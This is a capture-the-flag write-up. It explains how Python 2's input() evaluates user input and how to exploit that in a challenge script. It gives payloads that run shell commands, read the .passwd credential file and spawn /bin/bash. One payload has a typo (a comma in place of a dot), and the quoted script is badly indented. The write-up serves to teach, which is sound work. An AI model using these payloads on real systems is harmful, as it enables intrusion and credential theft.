# Python: input()

## Statement

Get the password in the .passwd file by exploiting a vulnerability in this python script.

----
# Analysis

The give code has an vulnerability over python `input()` function, due to which I was able to crack the program and got the rce.

```python

#!/usr/bin/python2
     
import sys
     
def youLose():
    print "Try again ;-)"
    sys.exit(1)
       
 try:
     p = input("Please enter password : ")
except:
     youLose()
      
with open(".passwd") as f:
     passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()

```

The flow : 

> Prompts the user for a password input, reads the real password from the `.passwd` file, compares the input against the stored password. Importantly, the program usage `python2`

### Vulnerability: 
 
Since the program using `python2` rather then `python3`, the `input()` behaves fundamentally different. 

| Version | how `input()` works.  | 
| ------------- | -------------- |
| 2 | Evaluates the input as python code `eval(raw_input())`|
| 3 | Reads input as a plain string |

### Exploitation

Let's try some payloads to get the rce.
`1==1`, this evaluates to `True`, but the check is `p == int(passwd)` so, it won't work as far.

![common-payload](https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/common-payload.png)

Another try. 
```python
__import__('os').system('whoami')
# Since, `input()` calls `eval()`, we can run arbitrary python code.

__import__('os'),system('cat .passwd') # Directly cat the `.passwd`
```

![cracked](https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/cracked.png)

Getting shell
```python2
__import__('os').system('/bin/bash') # spawns the shell with /bin/bash
```

![rce](https://raw.githubusercontent.com/pwnspirit/files/main/notes/ch6/rce.png)

----

Resources: 
* [https://vickieli.dev/hacking/hack-python/](https://vickieli.dev/hacking/hack-python/) 
* [https://github.com/pwnspirit/files/tree/main/notes/ch6](https://github.com/pwnspirit/files/tree/main/notes/ch6) 
* [https://ctf.pwnspirit.xyz/rootme/APP_Script/python-input.html](https://ctf.pwnspirit.xyz/rootme/APP_Script/python-input.html)

---- 
